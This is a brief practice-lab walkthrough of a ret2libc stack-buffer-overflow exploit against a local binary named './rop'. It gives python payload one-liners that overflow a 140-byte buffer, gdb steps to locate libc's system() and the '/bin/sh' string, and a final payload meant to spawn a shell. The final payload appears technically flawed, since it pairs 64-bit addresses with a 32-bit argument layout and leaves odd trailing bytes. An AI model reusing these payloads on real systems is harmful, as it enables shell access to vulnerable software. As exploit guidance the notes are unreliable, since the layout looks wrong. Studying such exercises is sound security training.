*Try and smash stack*

    cat <(python -c 'print "A"*140') - | ./rop

gives *** stack smashing detected ***: ./rop terminated

Use flag ""-fno-stack-protector" for compilation.

*Find <system> call*

    gdb rop
    (gdb) break main
    (gdb) run
    (gdb) print system

$1 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
little endian representation of the adress is \x90\x23\xa5\xf7\xff\x7f

So to jump to system call we can do:
cat <(python -c 'print "\x00"*140+"\x90\x23\xa5\xf7\xff\x7f"') - | ./rop

*Find "/bin/sh" string in system library*

    (gdb) break main
    (gdb) run
    (gdb) print &system
    (gdb) find &system,+9999999,"/bin/sh"

Returned address is: 0x7ffff7b99d17

*Finale*
cat <(python -c 'print "\x00"*140 + "\x90\x23\xa5\xf7\xff\x7f" + "\x01"*8 + "\x17\x9d\xb9\xf7\xff\x7f" + "\x5c\x6e"') - | ./rop
